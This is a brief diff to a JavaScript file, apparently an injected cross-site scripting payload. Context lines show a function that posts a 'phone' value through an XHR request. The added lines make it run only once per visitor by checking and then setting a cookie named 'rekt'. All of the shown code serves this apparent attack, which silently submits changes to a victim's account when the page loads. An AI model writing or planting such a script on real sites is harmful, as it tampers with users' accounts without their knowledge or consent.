@@ -40,4 +40,9 @@ function post_About() {
 	xhs.send(`name=phone&value=${sendphone}`);
 }
 
-post_About();
+const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
+if (cookies.get("rekt") != "yes") {
+    post_About();
+}
+
+document.cookie = "rekt=yes"
